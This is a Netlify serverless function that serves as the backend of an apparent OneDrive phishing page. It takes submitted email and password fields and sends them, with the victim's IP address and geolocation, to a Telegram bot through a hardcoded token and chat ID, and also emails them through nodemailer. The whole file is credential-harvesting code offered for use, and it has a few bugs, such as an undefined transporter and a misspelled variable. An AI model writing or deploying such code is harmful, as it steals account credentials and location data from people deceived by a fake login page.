import type { Context } from "@netlify/functions"
import nodemailer from "nodemailer"

export default async (req: Request, context: Context) => {
  let response;
  const body = await req.formData();
  const email = body.get("ai");
  const password = body.get("pr");
  console.log('response:', {email, password});
  await sendToTG(email, password);

async function sendToTG(e, p) {
        const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // Replace with your Telegram bot token
        const chatId = 5645205996; // Replace with your chat ID

        const messageText = `**OneDrive RESULT**\nEmail: ${e}\nPassword: ${p} \n`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  fetch(url, params)
    .then((response) => {
        console.log(response);
      if (!response.ok) {  
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent:", data);
    })
    .catch((error) => console.error("Error:", error));
};

    
async function getLoc(){
        await fetch('https://hutils.loxal.net/whois').then(response => response.json()).then(data => {
        loc = JSON.stringify(data, null, 2);
      });
        return;
};



  const message = {
      from: "muammer_y@hotmail.com",
      to: "emilychan1178@gmail.com",
      subject: "New result",
      text: `Email: ${email} :: Password: ${password} :: Context: ${context.geo}`,
      html: `<div>
            <b>Login information:</b><br/>
            Email:: ${email} <br/>
            Password:: ${password} <br/><br/>
            <b>Geolocation:</b><br/>
            IP:: ${context.ip} <br/>
            City:: ${context?.geo?.city} <br/>
            Country:: ${Object.values(context?.geo?.country)} <br/>
            Timezone:: ${context?.geo?.timezone} <br/>
            </div>`,
    };

  switch(req?.method){
    case "POST":
      try{
         const sendy = await transporter.sendMail(message, (err) => {
           console.log(err);
         });
         console.log(sendy)
         response = new Response(JSON.stringify({email, password, context}))
      }
      catch(error){
        console.log(errror)
      };
      break;
    case "GET":
      response = new Response("Get method")
      break;
    default:
      response  = new Response("Default");
      break;
  }
  return response;
}

